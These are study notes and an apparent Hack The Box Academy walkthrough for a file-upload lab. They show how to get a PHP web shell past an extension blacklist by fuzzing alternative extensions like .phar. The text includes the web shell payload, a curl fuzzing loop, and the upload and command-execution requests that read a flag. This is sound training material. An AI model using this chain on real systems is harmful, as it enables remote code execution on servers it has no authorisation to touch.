# Section 5 — Blacklist Filters

## ID
531

## Module
File Upload Attacks

## Kind
notes

## Title
Section 5 — Blacklist Filters

## Description
Bypassing back-end extension blacklists by fuzzing for alternative PHP extensions (`.phar`, `.phtml`, `.phps`, `.pht`, etc.) that still execute PHP code on the server.

## Tags
file-upload, blacklist-bypass, php-extensions, fuzzing, burp-intruder

## Commands
- `curl -s http://<TARGET>/upload.php -F "uploadFile=@-;filename=shell.phar;type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'`
- `curl -s "http://<TARGET>/profile_images/shell.phar?cmd=cat+/flag.txt"`
- `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst -O php_extensions.lst`
- `while read ext; do result=$(curl -s http://<TARGET>/upload.php -F "uploadFile=@-;filename=shell${ext};type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'); echo "${ext} : ${result}"; done < php_extensions.lst`

## What This Section Covers
When a web application applies a back-end blacklist to block known dangerous extensions (e.g., `.php`, `.php7`, `.phps`), the blacklist is almost never comprehensive. Alternative PHP extensions like `.phar`, `.phtml`, `.pht`, `.pgif`, and `.inc` may still be allowed and will execute PHP code on most Apache/PHP configurations. Fuzzing the upload endpoint with a wordlist of extensions reveals which ones slip through.

## Methodology
1. Attempt to upload `shell.php` — confirm the back-end rejects it with "Extension not allowed" (proving server-side blacklist exists, not just client-side).
2. Grab a PHP extensions wordlist (PayloadsAllTheThings or SecLists).
3. Fuzz the upload endpoint — use Burp Intruder (position on the extension in `filename="shell§.php§"`) or a `curl` loop. Disable URL-encoding in Burp so the `.` isn't encoded.
4. Sort results by response length — responses with `File successfully uploaded` (length 193) indicate non-blacklisted extensions.
5. Pick a working extension (`.phar`, `.phtml`, etc.), upload a proper web shell with that extension.
6. Visit `/profile_images/shell.phar?cmd=cat+/flag.txt` to get RCE and read the flag.

## Multi-step Workflow (curl — full chain)
```
# 1. Confirm blacklist blocks .php
curl -s http://<TARGET>/upload.php \
  -F "uploadFile=@-;filename=shell.php;type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'

# 2. Fuzz extensions
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst -O php_extensions.lst

while read ext; do
  result=$(curl -s http://<TARGET>/upload.php \
    -F "uploadFile=@-;filename=shell${ext};type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>')
  echo "${ext} : ${result}"
done < php_extensions.lst

# 3. Upload with allowed extension
curl -s http://<TARGET>/upload.php \
  -F "uploadFile=@-;filename=shell.phar;type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'

# 4. Get flag
curl -s "http://<TARGET>/profile_images/shell.phar?cmd=cat+/flag.txt"
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Read /flag.txt | `FLAG_HERE` | Fuzzed extensions, uploaded `.phar` web shell, invoked at `/profile_images/shell.phar?cmd=cat+/flag.txt` |

## Key Takeaways
- Blacklists are inherently incomplete — there are too many executable PHP extensions to block them all (`.phar`, `.phtml`, `.pht`, `.pgif`, `.inc`, `.module`, mixed-case `.pHp` on Windows).
- Whitelists are always stronger than blacklists for file extension validation.
- The blacklist comparison is often **case-sensitive** — on Windows servers, `.pHp` bypasses a lowercase-only blacklist and still executes.
- Not every allowed extension executes PHP on every server — you may need to try several from the fuzz results until one gives RCE.
- The `Content-Type` header wasn't validated here — only the extension mattered, which is the weakest form of back-end validation.

## Gotchas
- In Burp Intruder, **disable URL encoding** in Payload Options — otherwise the `.` before the extension gets encoded as `%2e` and the server sees a mangled filename.
- If fuzzing with curl, quote the heredoc properly — a missing quote will break the loop silently.
- Some extensions like `.phps` show source code instead of executing it — useful for recon but not for RCE.

# HTB Solution


## Question 1

### "Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt""

After spawning the target machine, students need to visit its website's root page and upload any image so that the sent request can be intercepted by `Burp Suite`:

![File_Upload_Attacks_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_9.png)

Students then need to send the request to `Intruder` (`Ctrl` + `I`), change "filename" to be `RCE§.php§`, and change the content of the image to instead fetch the flag file if a request succeeds:

        php
`<?php system('cat /flag.txt'); ?>`

![File_Upload_Attacks_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_10.png)

Then, students need to copy the items of the [PHP extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list and paste them under `Payload Options`:

![File_Upload_Attacks_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_11.png)

Students need to also disable URL encoding, then click `Start Attack`:

![File_Upload_Attacks_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_12.png)

After the attack finishes, students need to sort the results by "Length", and will find that responses with a length of `193` have a message of "File successfully uploaded":

![File_Upload_Attacks_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_13.png)

Thus, students then need to create a web shell with the `.phar` extension with the following payload and then upload it as done previously:

        php
`<?php system($_REQUEST['cmd']); ?>`

![File_Upload_Attacks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_14.png)

After forwarding the request, students can either use `cURL` or the browser to fetch the flag file; `cURL` will be used:

        shell
`curl -s http://STMIP:STMPO/profile_images/WebShell.phar?cmd=cat+/flag.txt`

        shell-session
`┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~] └──╼ [★]$ curl -s "http://206.189.124.56:32615/profile_images/WebShell.phar?cmd=cat+/flag.txt" HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`

Answer: {hidden}